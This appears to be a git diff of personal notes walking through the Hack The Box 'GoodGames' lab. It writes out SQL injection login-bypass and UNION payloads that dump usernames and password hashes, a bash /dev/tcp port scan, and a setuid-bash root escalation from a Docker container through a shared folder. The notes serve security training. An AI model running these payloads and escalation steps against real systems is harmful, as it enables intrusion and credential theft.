@@ -1,7 +1,21 @@
 #linux 
+# Story
+1. Port scan
+2. found http
+3. we can go to the userpage
+4. we noticed that it has sql injection vuln
+5. got password for admin page
+6. there is another domain
+7. we can perform SSTI
+8. Reverse shell (user flag)
+9. the shell is for docker
+10. look for the host
+11. host and container shares a folder
+12. bash with root's permission
+13. run the bas (root flag)
 
 # Enumeration
-## nmap
+## Nmap
 ```
 nmap -sC -sV goodgames.htb 
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-21 10:09 EST
@@ -26,23 +40,6 @@ Nmap done: 1 IP address (1 host up) scanned in 32.93 seconds
 200      GET      267l      553w     9294c http://goodgames.htb/password-reset
 ```
 
-## Check the website
-
-![[Pasted image 20230222005844.png]]
-Flask, so python?
-
-### signin
-![[Pasted image 20230222001214.png]]
-
-### Signup
-![[Pasted image 20230222003933.png]]
-
-![[Pasted image 20230222005226.png]]
-
-### posts
-User: Wolfenstein,Hitman, Witch Murder,
-
-
 ## Check header
 ```
 curl -I http://goodgames.htb
@@ -52,68 +49,85 @@ Server: Werkzeug/2.0.2 Python/3.9.2
 Content-Type: text/html; charset=utf-8
 Content-Length: 85107
 ```
+Nothing interesting
 
-
-### searchsploit
+## Searchsploit
 ```
 searchsploit werkzeug 2.0.2
 Exploits: No Results
 Shellcodes: No Results
 ```
+Nothing interesting
+
+## Check the website
+
+![[Pasted image 20230222005844.png]]
+Flask, so python?
+
+### Signin
+![[Pasted image 20230222001214.png]]
+I dont have credentials, so lets make one.
+
+### Signup
+![[Pasted image 20230222003933.png]]
+
+![[Pasted image 20230222005226.png]]
+Login!
+
 
 # Foothold
 ## SQL Injection
+Lets go back to the login page and try some injection.
 
-### signin
-#### bypass
+### Signin bypass
 `email=' or 1=1-- -&password=tofu` this works to bypass login.
 double dash is for comment, single dash is for protect from trailing space.
 before I have registered someone named toh and tofu
-```
-                    <h2 class="h4">Welcome admintohtofu</h2>
+```html
+<h2 class="h4">Welcome admintohtofu</h2>
 ```
 
 It is possible that all the usernames are displayed?
 
 ### Union injection
 #### email=' union all select 1,2,3,4-- -&password=tofu
-```
-                   <h2 class="h4">Welcome 4</h2>
+```html
+<h2 class="h4">Welcome 4</h2>
 ```
 
 ### Get database name
 #### email=' union select 1,2,3,database()-- -&password=tofu
 
 we need to have match the number of columns when we try injection, so we start with 
-```
-                   <h2 class="h4">Welcome main</h2>
+```html
+<h2 class="h4">Welcome main</h2>
 ```
 
 
 ### Check all schemes
 #### email=' union all select 1,2,3, concat(schema_name,':') from information_schema.schemata-- -&password=tofu
 need to put concat for field padding, schema name is main?
-```
-                   <h2 class="h4">Welcome information_schema:main:</h2>
+```html
+<h2 class="h4">Welcome information_schema:main:</h2>
 ```
 
 ### Check all tables
 #### email=' union all select 1,2,3, concat(table_name,':') from information_schema.tables where table_schema = 'main'-- -&password=tofu
 
-```
-                   <h2 class="h4">Welcome blog:blog_comments:user:</h2>
+```html
+<h2 class="h4">Welcome blog:blog_comments:user:</h2>
 ```
 
 ### Get column name
 #### email=' union all select 1,2,3, concat(column_name,':') from information_schema.columns where table_name = 'user'-- -&password=tofu
-```
-                   <h2 class="h4">Welcome id:email:password:name:</h2>
+```html
+<h2 class="h4">Welcome id:email:password:name:</h2>
 ```
 
 ### Get user items
 #### email=' union all select 1,2,3, concat(id,':',email,':',password,':',name,':') from user-- -&password=tofu
 
-```
+```html
 <h2 class="h4">Welcome 1:admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec:admin:2:toh@gmail.com:eaee0cdd2c82e89f15078ff33ca37e46:toh:3:t@gmail.com:5df7f1701b778d03d57456afea567922:tofu:</h2>
 ```
 
@@ -182,10 +196,10 @@ root@3a453ab39d3d:/home/augustus# cat user.txt
 cat user.txt
 ```
 
-# Privilege Escalation???
+# Privilege Escalation
+It seems like we already have root permission?? This is weird but lets look around.
 ## Enumeration
-
-### dockerenv
+### Dockerenv
 ```
 root@3a453ab39d3d:/# ls -al
 ls -al
@@ -242,6 +256,7 @@ nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/bin/false
 ```
 
+Where is augustus??
 ```
 root@3a453ab39d3d:/home/augustus# ls -al
 ls -al
@@ -255,7 +270,7 @@ lrwxrwxrwx 1 root root    9 Nov  3  2021 .bash_history -> /dev/null
 -rw-r----- 1 1000 1000   33 Feb 22 10:16 user.txt
 ```
 
-### check mount
+### Check mount
 ```
 /dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
 /dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro)
@@ -264,7 +279,8 @@ lrwxrwxrwx 1 root root    9 Nov  3  2021 .bash_history -> /dev/null
 ```
 augustus was there
 
-actually I am in the container
+## Container
+actually I am in the container!
 ```
 root@3a453ab39d3d:/backend# ls
 ls
@@ -272,7 +288,7 @@ Dockerfile
 project
 requirements.txt
 ```
-### ifconfig
+### Ifconfig
 ```
 root@3a453ab39d3d:/home/augustus# ifconfig
 ifconfig
@@ -293,7 +309,7 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
 
-### ping scan
+### Ping scan
 first two numbers are 172.19
 ```
 root@3a453ab39d3d:/backend# for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
@@ -303,7 +319,7 @@ root@3a453ab39d3d:/backend# for i in {1..254}; do (ping -c 1 172.19.0.${i} | gre
 
 ```
 
-### port scan
+### Port scan
 
 ```
 for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
@@ -338,7 +354,7 @@ permitted by applicable law.
 augustus@GoodGames:~$   
 ```
 
-### hostname
+### Hostname
 ```
 augustus@GoodGames:~$ hostname -I
 hostname -I
@@ -351,8 +367,9 @@ augustus@GoodGames:~$ sudo -l
 sudo -l
 -bash: sudo: command not found
 ```
+Nothing 
 
-### check docker
+### Check docker
 ```
 augustus@GoodGames:~$ ps aux | grep docker
 ps aux | grep docker
@@ -404,11 +421,25 @@ Since they share the same folder and one has a root permission, we can copy binb
 now augustus can run the bash and it will be run as root, so we can perform privilege escalation
 
 On augustus
+```
 cp /bin/bash .
+```
+to get bash in the shared folder
 
 On container
+```
 chown root:root bash
 chmod 4777 bash
+```
+Setuid helps us to run the program as a root.
 
 On augustus
+```
 ./bash -p
+```
+with -p option, bash keeps the effective user id.
+
+
+# Reference
+
+https://0xdf.gitlab.io/2022/02/23/htb-goodgames.html
